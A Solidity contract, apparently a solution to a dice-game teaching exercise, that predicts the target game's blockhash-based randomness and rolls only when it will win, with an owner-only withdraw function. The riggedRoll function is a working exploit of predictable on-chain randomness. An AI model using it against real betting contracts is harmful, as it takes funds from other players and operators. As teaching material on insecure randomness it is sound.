pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        require(_amount<=address(this).balance, "withdrawing too much");
        (bool succ, )= _addr.call{value:_amount}("");
        require(succ, "withdraw failed");
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public payable onlyOwner {
        require(address(this).balance >= .002 ether, "need at least .002 ether brev");
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;
        require(roll<3, "roll ain't less than 3");
        diceGame.rollTheDice{value:msg.value}();
    }



    //Add receive() function so contract can receive Eth
    receive() external payable {}
    
}
